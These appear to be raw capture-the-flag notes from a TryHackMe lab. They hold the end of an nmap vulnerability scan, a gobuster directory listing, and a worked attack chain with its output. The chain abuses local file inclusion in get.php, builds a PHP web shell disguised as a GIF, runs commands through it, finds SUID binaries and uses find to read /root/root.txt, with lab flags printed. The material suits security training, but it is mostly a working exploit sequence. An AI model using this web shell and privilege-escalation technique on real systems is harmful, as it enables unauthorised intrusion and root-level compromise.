|     	A6687F08-B033-5AE7-84F5-DE799491DA2F	7.5	https://vulners.com/githubexploit/A6687F08-B033-5AE7-84F5-DE799491DA2F	*EXPLOIT*
|     	A66531EB-3C47-5C56-B8A6-E04B54E9D656	7.5	https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656	*EXPLOIT*
|     	A0F268C8-7319-5637-82F7-8DAF72D14629	7.5	https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629	*EXPLOIT*
|     	9814661A-35A4-5DB7-BB25-A1040F365C81	7.5	https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81	*EXPLOIT*
|     	8132DEBA-6222-5A32-84DE-B97EF48D0F99	7.5	https://vulners.com/githubexploit/8132DEBA-6222-5A32-84DE-B97EF48D0F99	*EXPLOIT*
|     	7C6FD510-4E4C-564E-ADDC-8BC362BE504C	7.5	https://vulners.com/githubexploit/7C6FD510-4E4C-564E-ADDC-8BC362BE504C	*EXPLOIT*
|     	45D138AD-BEC6-552A-91EA-8816914CA7F4	7.5	https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4	*EXPLOIT*
|     	40879618-C556-547C-8769-9E63E83D0B55	7.5	https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55	*EXPLOIT*
|     	1F6E0709-DA03-564E-925F-3177657C053E	7.5	https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E	*EXPLOIT*
|     	135C45BD-4652-5EEE-8890-2D3C62709016	7.5	https://vulners.com/githubexploit/135C45BD-4652-5EEE-8890-2D3C62709016	*EXPLOIT*
|     	1337DAY-ID-35422	7.5	https://vulners.com/zdt/1337DAY-ID-35422*EXPLOIT*
|     	0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8	7.5	https://vulners.com/githubexploit/0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8	*EXPLOIT*
|     	CVE-2025-49812	7.4	https://vulners.com/cve/CVE-2025-49812
|     	HTTPD:D66D5F45690EBE82B48CC81EF6388EE8	7.3	https://vulners.com/httpd/HTTPD:D66D5F45690EBE82B48CC81EF6388EE8
|     	CVE-2023-38709	7.3	https://vulners.com/cve/CVE-2023-38709
|     	CVE-2020-35452	7.3	https://vulners.com/cve/CVE-2020-35452
|     	CNVD-2024-36395	7.3	https://vulners.com/cnvd/CNVD-2024-36395
|     	CVE-2025-65082	6.5	https://vulners.com/cve/CVE-2025-65082
|     	CNVD-2025-30833	6.5	https://vulners.com/cnvd/CNVD-2025-30833
|     	CVE-2024-24795	6.3	https://vulners.com/cve/CVE-2024-24795
|     	CNVD-2024-36394	6.3	https://vulners.com/cnvd/CNVD-2024-36394
|     	HTTPD:5FF2D6B51D8115FFCB653949D8D36345	6.1	https://vulners.com/httpd/HTTPD:5FF2D6B51D8115FFCB653949D8D36345
|     	CVE-2020-1927	6.1	https://vulners.com/cve/CVE-2020-1927
|     	CNVD-2020-21904	6.1	https://vulners.com/cnvd/CNVD-2020-21904
|     	CVE-2023-45802	5.9	https://vulners.com/cve/CVE-2023-45802
|     	HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05	5.5	https://vulners.com/httpd/HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05
|     	CVE-2020-13938	5.5	https://vulners.com/cve/CVE-2020-13938
|     	CNVD-2021-44765	5.5	https://vulners.com/cnvd/CNVD-2021-44765
|     	CVE-2025-66200	5.4	https://vulners.com/cve/CVE-2025-66200
|     	CNVD-2025-30835	5.4	https://vulners.com/cnvd/CNVD-2025-30835
|     	HTTPD:EB26BC6B6E566C865F53A311FC1A6744	5.3	https://vulners.com/httpd/HTTPD:EB26BC6B6E566C865F53A311FC1A6744
|     	HTTPD:BAAB4065D254D64A717E8A5C847C7BCA	5.3	https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
|     	HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F	5.3	https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
|     	HTTPD:7633AF814EE2E30990BFD8AEA5C7DAC1	5.3	https://vulners.com/httpd/HTTPD:7633AF814EE2E30990BFD8AEA5C7DAC1
|     	HTTPD:5C8B0394DE17D1C29719B16CE00F475D	5.3	https://vulners.com/httpd/HTTPD:5C8B0394DE17D1C29719B16CE00F475D
|     	CVE-2022-37436	5.3	https://vulners.com/cve/CVE-2022-37436
|     	CVE-2022-28614	5.3	https://vulners.com/cve/CVE-2022-28614
|     	CVE-2022-28330	5.3	https://vulners.com/cve/CVE-2022-28330
|     	CVE-2021-30641	5.3	https://vulners.com/cve/CVE-2021-30641
|     	CVE-2020-1934	5.3	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-17567	5.3	https://vulners.com/cve/CVE-2019-17567
|     	CNVD-2023-30859	5.3	https://vulners.com/cnvd/CNVD-2023-30859
|     	CNVD-2022-53582	5.3	https://vulners.com/cnvd/CNVD-2022-53582
|     	CNVD-2022-51059	5.3	https://vulners.com/cnvd/CNVD-2022-51059
|     	CNVD-2021-44766	5.3	https://vulners.com/cnvd/CNVD-2021-44766
|     	CNVD-2020-46278	5.3	https://vulners.com/cnvd/CNVD-2020-46278
|_    	CNVD-2020-29872	5.3	https://vulners.com/cnvd/CNVD-2020-29872
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.18 seconds
root@ip-10-112-112-145:~/Desktop# 



# :1336

gobuster dir -u http://10.200.150.152:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
THM{a12afb5e-97c7-457e-8737-860e348a37aa}
THM{e083b271-6acf-44c2-a6a8-7538c4cd8f04}

/uploads              (Status: 301) [Size: 325] [--> http://10.200.150.152:1337/uploads/]
/css                  (Status: 301) [Size: 321] [--> http://10.200.150.152:1337/css/]
/js                   (Status: 301) [Size: 320] [--> http://10.200.150.152:1337/js/]
/server-status        (Status: 403) [Size: 281]


/css                  (Status: 301) [Size: 321] [--> http://10.200.150.152:1337/css/]
/get.php              (Status: 200) [Size: 18]
/index.php            (Status: 200) [Size: 5485]
/index.php            (Status: 200) [Size: 5485]
/js                   (Status: 301) [Size: 320] [--> http://10.200.150.152:1337/js/]
/server-status        (Status: 403) [Size: 281]
/upload.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 325]

.php and others not working

http://10.200.150.152:1337/get.php?file=/etc/passwd
http://10.200.150.152:1337/get.php?file=/upload.php

echo "474946383961" | xxd -r -p > shell.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif

root@ip-10-112-112-145:~/network# curl "http://10.200.150.152:1337/get.php?file=shell.gif&cmd=id"
GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data),1002(findgroup)
root@ip-10-112-112-145:~/network# 

curl "http://10.200.150.152:1337/get.php?file=shell.gif&cmd=find+/+-perm+-4000+2>/dev/null"

root@ip-10-112-112-145:~/Desktop# curl "http://10.200.150.152:1337/get.php?file=shell.gif&cmd=/usr/bin/find+.+-exec+cat+/root/root.txt+\;+-quit"
GIF89aTHM{e083b271-6acf-44c2-a6a8-7538c4cd8f04}
root@ip-10-112-112-145:~/Desktop# 

